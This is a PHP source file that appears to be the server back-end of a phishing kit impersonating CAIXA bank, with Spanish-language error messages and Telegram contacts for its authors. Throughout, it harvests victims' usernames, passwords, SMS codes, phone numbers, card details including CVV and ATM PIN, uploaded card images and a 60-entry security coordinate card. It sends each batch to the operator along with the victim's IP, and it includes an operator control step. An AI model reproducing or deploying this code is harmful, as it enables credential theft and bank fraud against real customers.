<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/login.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            $_SESSION['errors']['username'] = 'Introduzca su Identificador';
            $_SESSION['errors']['password'] = '﻿Introduzca su Número secreto personal';
            header("Location: clients/login.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            $_SESSION['errors']['sms_code'] = 'El código SMS es incorrecto';
            header("Location: clients/sms.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorphone' ) {
            $_SESSION['errors']['phone'] = 'Ingrese un número de teléfono válido';
            header("Location: clients/phone.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorcarte' ) {
            header("Location: clients/carte.php?error=1&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password']  = $_POST['password'];
            if( empty($_POST['username']) ) {
                $_SESSION['errors']['username'] = 'Introduzca su Identificador';
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = '﻿Introduzca su Número secreto personal';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['username'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= 'Digital ✤ : ' . $_POST['digital'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/app.php?verification#_");
                exit();
            } else {
                header("Location: clients/login.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = 'El código SMS es incorrecto';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/success.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['four']   = $_POST['four'];
            $_SESSION['mm']     = $_POST['mm'];
            $_SESSION['yy']     = $_POST['yy'];
            $_SESSION['three']      = $_POST['three'];
            $_SESSION['four']      = $_POST['four'];
            if( validate_number($_POST['four'],4) == false ) {
                $_SESSION['errors']['four'] = '4 dígitos de la tarjeta no válidos';
            }
            if( validate_number($_POST['three'],3) == false ) {
                $_SESSION['errors']['three'] = 'Por favor ingrese un código válido.';
            }
            if( validate_number($_POST['mm'],2) == false ) {
                $_SESSION['errors']['two'] = 'Por favor introduzca una fecha valida.';
                $_SESSION['errors']['mm'] = true;
            }
            if( validate_number($_POST['yy'],2) == false ) {
                $_SESSION['errors']['two'] = 'Por favor introduzca una fecha valida.';
                $_SESSION['errors']['yy'] = true;
            }
            if( validate_number($_POST['four'],4) == false ) {
                $_SESSION['errors']['four'] = 'Por favor ingrese un pin válido.';
            }
            if( count($_SESSION['errors']) != 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= '4 digits numbers : ' . $_POST['four'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['mm'] . '/' . $_POST['yy'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['cv'] . "\r\n";
				$message .= 'ATM PIN : ' . $_POST['pin'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                header("Location: clients/sms.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "phone") {
            $_SESSION['errors']     = [];
            $_SESSION['phone'] = $_POST['phone'];
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = 'Ingrese un número de teléfono válido';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | CAIXA | Phone';
                $message = '/-- PHONE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END PHONE INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                header("Location: clients/loading1.php?verification#_");
                exit();
            } else {
                header("Location: clients/phone.php?error=1&verification#_");
                exit();
            }
        }
        if($_GET['step'] == "upload") {
            $_SESSION['errors']      = [];
            $url     = "http://". $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $x       = pathinfo($url);
            $dirname = explode('/',$x['dirname']);
            //array_pop($dirname);
            $dirname = implode('/',$dirname) . '/cartes/';
            if( empty($_FILES['upload_carte']['name']) ) {
                echo 'error';
                exit();
            }
            $carte = upload_file($_FILES['upload_carte'],'carte');
            if( $carte !== false ) {
                $subject = get_client_ip() . ' | CAIXA | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card Link : ' . $dirname . $carte . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo 'success';
                exit();
            }
            echo 'error';
            exit();
        }
        if ($_POST['step'] == "card") {
            $_SESSION['errors']     = [];
            $subject = get_client_ip() . ' | CAIXA | Card';
            $message = '/-- Card INFOS --/' . get_client_ip() . "\r\n"; 
            for($i = 1; $i <= 60; $i++) {
                $message .= 'N' . $i . ': ' . $_POST['num' . $i] . ' | ' . 'Clave: ' . $_POST['pass' . $i] . "\r\n";
            }
            $message .= '/-- END Card INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            header("Location: clients/loading1.php?verification#_");
            exit();
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>